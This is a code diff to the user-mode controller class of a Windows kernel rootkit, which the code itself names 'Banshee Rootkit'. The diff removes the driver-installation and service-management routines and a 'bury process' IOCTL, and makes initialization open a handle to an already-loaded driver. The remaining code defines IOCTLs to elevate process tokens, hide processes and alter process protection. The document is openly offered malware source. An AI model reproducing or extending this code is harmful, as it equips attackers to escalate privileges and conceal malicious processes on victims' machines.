@@ -22,8 +22,6 @@ typedef struct _IOCTL_PROTECT_PROCESS_PAYLOAD {
     BYTE newProtectionLevel;
 } IOCTL_PROTECT_PROCESS_PAYLOAD;
 
-#define BE_IOCTL_BURY_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x803, METHOD_BUFFERED, FILE_ANY_ACCESS)
-
 #define BE_IOCTL_ELEVATE_TOKEN CTL_CODE(FILE_DEVICE_UNKNOWN, 0x804, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
 #define BE_IOCTL_HIDE_PROCESS CTL_CODE(FILE_DEVICE_UNKNOWN, 0x805, METHOD_BUFFERED, FILE_ANY_ACCESS)
@@ -75,14 +73,9 @@ BYTE PS_PROTECTED_NONE = 0x00; // Keine Keine
 class Banshee 
 {
 private:
-    const std::string serviceName = "Banshee";
-    const std::string serviceDescription = "Banshee Rootkit";
     const std::string deviceName = "\\\\.\\Banshee";
 
-    SC_HANDLE hSCManager = NULL;
-    SC_HANDLE hService = NULL;
     HANDLE hDevice = NULL; 
-    std::string driverPath;
 
 public:
 	Banshee()
@@ -96,40 +89,20 @@ public:
     }
 
     /**
-     * Installs the Banshee driver.
-     *
-     * @param driverPath Path of the Banshee.sys driver
-     * @return BANSHEE_STATUS status code.
-     */
-    BANSHEE_STATUS 
-    Install(const std::string& driverPath)
-    {
-        this->driverPath = driverPath;
-
-        if (!std::filesystem::exists(this->driverPath))
-        {
-            return BE_ERR_DRIVER_NOT_EXISTS;
-        }
-
-        if (!this->InstallDriver(this->driverPath))
-        {
-            return BE_ERR_FAILED_TO_INSTALL;
-        }
-        
-        return BE_SUCCESS;
-    }
-
-    /**
-     * Initializes the Banshee driver by starting the service.
+     * Initializes the Banshee driver by getting a handle to the driver.
      *
      * @return BANSHEE_STATUS status code.
      */
     BANSHEE_STATUS 
     Initialize()
     {
-        if (!this->StartDriver())
+        if (!this->hDevice)
         {
-            return BE_ERR_FAILED_TO_INITIALIZE;
+            this->hDevice = CreateFileA(this->deviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
+            if (!this->hDevice || this->hDevice == INVALID_HANDLE_VALUE)
+            {
+                return BE_ERR_FAILED_TO_INITIALIZE;
+            }
         }
         return BE_SUCCESS;
     }
@@ -146,25 +119,6 @@ public:
         if (this->hDevice)
         {
             CloseHandle(this->hDevice);
-        }
-
-        if (this->hService)
-        {
-            // Delete the service
-            DeleteService(this->hService);
-
-            // Stop the service
-            SERVICE_STATUS ss;
-            ControlService(this->hService, SERVICE_CONTROL_STOP, &ss);
-
-            // Close handle
-            CloseServiceHandle(this->hService);
-        }
-
-        // Close service manager handle
-        if (this->hSCManager)
-        {
-            CloseServiceHandle(this->hSCManager);
         }
 
         return BE_SUCCESS;
@@ -189,39 +143,6 @@ public:
             (LPVOID)&outBuf, sizeof(DWORD),
             &dwBytesReturned, NULL
         );
-
-        if (!success)
-        {
-            return BE_ERR_IOCTL;
-        }
-
-        return BE_SUCCESS;
-    }
-
-    /**
-    * Dispatches IOCTL to "bury" a process (stop it from recreating by adding a callback on process creation).
-    *
-    * @return BANSHEE_STATUS status code.
-    */
-    BANSHEE_STATUS
-    IoCtlBuryProcess(const std::string& processToBury) const
-    {
-        DWORD dwBytesReturned = 0;
-
-        // Convert to wchar*
-        INT wchars_num = MultiByteToWideChar(CP_UTF8, 0, processToBury.c_str(), -1, NULL, 0);
-        wchar_t* wsProcessToBury = new wchar_t[wchars_num];
-        MultiByteToWideChar(CP_UTF8, 0, processToBury.c_str(), -1, wsProcessToBury, wchars_num);
-  
-        BOOL success = DeviceIoControl(
-            this->hDevice,
-            BE_IOCTL_BURY_PROCESS,
-            (LPVOID)wsProcessToBury, ((DWORD)(wcslen(wsProcessToBury) + 1)) * sizeof(WCHAR),
-            NULL, 0,
-            &dwBytesReturned, NULL
-        );
-     
-        delete[] wsProcessToBury;
 
         if (!success)
         {
@@ -455,94 +376,5 @@ public:
         }
 
         return BE_SUCCESS;
-    }
-
-    bool InitDriverHandle()
-    {
-        // Prevent handle leaks
-        if (!this->hDevice)
-        {
-            this->hDevice = CreateFileA(this->deviceName.c_str(), GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
-            if (!this->hDevice)
-            {
-                return false;
-            }
-        }
-
-        return true;
-    }
-
-private:
-    bool InstallDriver(const std::string& driverPath)
-    {
-        // Prevent handle leaks
-        if (!this->hSCManager)
-        {
-            this->hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-            if (!hSCManager)
-            {
-                return false;
-            }
-        }
-
-        // Prevent handle leaks
-        if (!this->hService)
-        {
-            this->hService = CreateServiceA(
-                hSCManager,
-                this->serviceName.c_str(),
-                this->serviceDescription.c_str(),
-                SERVICE_START | DELETE | SERVICE_STOP,
-                SERVICE_KERNEL_DRIVER,
-                SERVICE_DEMAND_START, // do not start on boot
-                SERVICE_ERROR_IGNORE,
-                driverPath.c_str(),
-                NULL, NULL, NULL, NULL, NULL
-            );
-
-            if (!this->hService && GetLastError() != 1073) // Already exists
-            {
-                return false;
-            }
-        }
-
-        return true;
-    }
-
-    bool StartDriver()
-    {
-        // Prevent handle leaks
-        if (!this->hSCManager)
-        {
-            this->hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-            if (!hSCManager)
-            {
-                return false;
-            }
-        }
-
-        // Prevent handle leaks
-        if (!this->hService)
-        {
-            this->hService = OpenServiceA(
-                this->hSCManager,
-                this->serviceName.c_str(),
-                SERVICE_START | DELETE | SERVICE_STOP
-            );
-            if (!this->hService)
-            {
-                return false;
-            }
-        }
-
-        if (StartService(this->hService, 0, NULL) == 0)
-        {
-            if (GetLastError() != 1056) // Already running
-            {
-                return false;
-            }
-        }
-
-        return this->InitDriverHandle();
     }
 };
